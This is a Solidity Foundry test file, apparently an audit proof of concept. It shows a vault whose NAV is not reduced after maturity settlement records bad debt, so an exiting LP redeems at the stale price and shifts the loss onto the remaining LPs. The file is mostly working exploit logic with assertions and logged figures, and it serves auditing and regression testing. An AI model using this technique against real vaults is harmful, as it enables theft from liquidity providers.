// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MockPriceFeed} from "contracts/v1/test/MockPriceFeed.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";
import {VaultTestV2} from "./VaultV2.t.sol";

/// @notice Audit regression proof for the stale-NAV bad-debt window.
/// @dev Uses the protocol's own VaultTestV2 deployment/setup and only normal protocol calls.
///      No vm.store, deal(), token balance overwrite, synthetic vault shares, or contract patching.
///      The oracle update models an exogenous collateral-price move; it is not an attacker step.
contract VaultBadDebtScaleAudit is VaultTestV2 {
    function testAudit_ScaledRealizedLossIsShiftedToRemainingLPs() public {
        // Create real order exposure exactly through the upstream helper used by testBadDebt().
        vm.warp(currentTime + 2 days);
        buyXt(48.219178e8, 1000e8);

        // A second independent LP joins the vault through the public ERC-4626 deposit path.
        address exitingLp = vm.randomAddress();
        uint256 lpDeposit = 10_000e8;
        res.debt.mint(exitingLp, lpDeposit);
        vm.startPrank(exitingLp);
        res.debt.approve(address(vault), lpDeposit);
        vault.deposit(lpDeposit, exitingLp);
        vm.stopPrank();

        // Create a much larger legitimate secured FT issuance. This does not alter vault storage.
        // At the initial ~$2,000 collateral price, 100 ETH backs 100,000 DAI of debt at ~50% LTV.
        address borrower = vm.randomAddress();
        vm.startPrank(borrower);
        LoanUtils.fastMintGt(res, borrower, 100_000e8, 100e18);
        vm.stopPrank();

        // Model an external collateral-price shock before maturity. The attacker does NOT perform
        // this step in the exploit; it only produces an underwater state through the same oracle
        // interface the protocol already relies on for collateral risk.
        (uint80 roundId, int256 oldCollateralPrice, uint256 startedAt,, uint80 answeredInRound) =
            res.collateralOracle.latestRoundData();
        assertGt(oldCollateralPrice, 0, "invalid initial collateral price");
        MockPriceFeed.RoundData memory shocked = MockPriceFeed.RoundData({
            roundId: roundId + 1,
            answer: oldCollateralPrice / 4,
            startedAt: startedAt,
            updatedAt: block.timestamp,
            answeredInRound: answeredInRound + 1
        });
        vm.prank(deployer);
        res.collateralOracle.updateRoundData(shocked);

        vm.warp(currentTime + 92 days);

        uint256 lpShares = vault.balanceOf(exitingLp);
        uint256 totalSupplyBefore = vault.totalSupply();
        uint256 nominalAssetsBefore = vault.totalAssets();
        assertGt(lpShares, 0, "LP has no shares");
        assertGt(totalSupplyBefore, lpShares, "no remaining LP after exit");

        // Curator performs the intended maturity settlement. The bug is what happens to NAV next.
        vm.prank(curator);
        vault.redeemOrder(res.order);

        uint256 badDebt = vault.badDebtMapping(address(res.collateral));
        uint256 deliveredCollateral = res.collateral.balanceOf(address(vault));
        assertGt(badDebt, 0, "scenario produced no bad debt");

        (, int256 collateralPrice,,,) = res.collateralOracle.latestRoundData();
        (, int256 debtPrice,,,) = res.debtOracle.latestRoundData();
        assertGt(collateralPrice, 0, "invalid shocked collateral price");
        assertGt(debtPrice, 0, "invalid debt-token price");

        uint256 collateralUnit = 10 ** res.collateral.decimals();
        uint256 debtUnit = 10 ** res.debt.decimals();
        uint256 deliveredValueInDebt = Math.mulDiv(
            deliveredCollateral,
            uint256(collateralPrice) * debtUnit,
            collateralUnit * uint256(debtPrice),
            Math.Rounding.Floor
        );
        uint256 realizedLoss = badDebt > deliveredValueInDebt ? badDebt - deliveredValueInDebt : 0;
        assertGt(realizedLoss, 0, "delivered collateral fully covers bad debt");

        // Critical accounting invariant: settlement recognized badDebt but did not haircut NAV.
        assertEq(vault.totalAssets(), nominalAssetsBefore, "settlement unexpectedly haircutted totalAssets");
        assertEq(vault.totalSupply(), totalSupplyBefore, "settlement unexpectedly changed share supply");

        uint256 stalePayout = vault.previewRedeem(lpShares);
        uint256 economicAssets = vault.totalAssets() - realizedLoss;
        uint256 fairPayout = Math.mulDiv(lpShares, economicAssets + 1, totalSupplyBefore + 1, Math.Rounding.Floor);
        uint256 shiftedLoss = stalePayout - fairPayout;
        assertGt(shiftedLoss, 0, "no stale-NAV exit advantage");

        uint256 lpBalanceBefore = res.debt.balanceOf(exitingLp);
        vm.prank(exitingLp);
        uint256 assetsOut = vault.redeem(lpShares, exitingLp, exitingLp);
        assertEq(assetsOut, stalePayout, "LP was not paid stale NAV");
        assertEq(res.debt.balanceOf(exitingLp) - lpBalanceBefore, stalePayout, "LP did not receive underlying");
        assertEq(
            vault.badDebtMapping(address(res.collateral)), badDebt, "ordinary redeem unexpectedly retired recorded bad debt"
        );

        uint256 actualRemainingEconomicAssets = vault.totalAssets() - realizedLoss;
        uint256 fairRemainingEconomicAssets = economicAssets - fairPayout;
        uint256 extraLossOnRemainingLps = fairRemainingEconomicAssets - actualRemainingEconomicAssets;
        assertApproxEqAbs(extraLossOnRemainingLps, shiftedLoss, 2, "exit gain is not conserved as victim loss");

        emit log_named_uint("bad debt raw", badDebt);
        emit log_named_uint("delivered collateral raw", deliveredCollateral);
        emit log_named_uint("delivered collateral value in debt raw", deliveredValueInDebt);
        emit log_named_uint("realized net loss raw", realizedLoss);
        emit log_named_uint("vault nominal assets after settlement raw", vault.totalAssets() + assetsOut);
        emit log_named_uint("exiting LP shares", lpShares);
        emit log_named_uint("stale redeem payout raw", stalePayout);
        emit log_named_uint("fair loss-adjusted payout raw", fairPayout);
        emit log_named_uint("loss shifted to remaining LPs raw", shiftedLoss);
    }
}
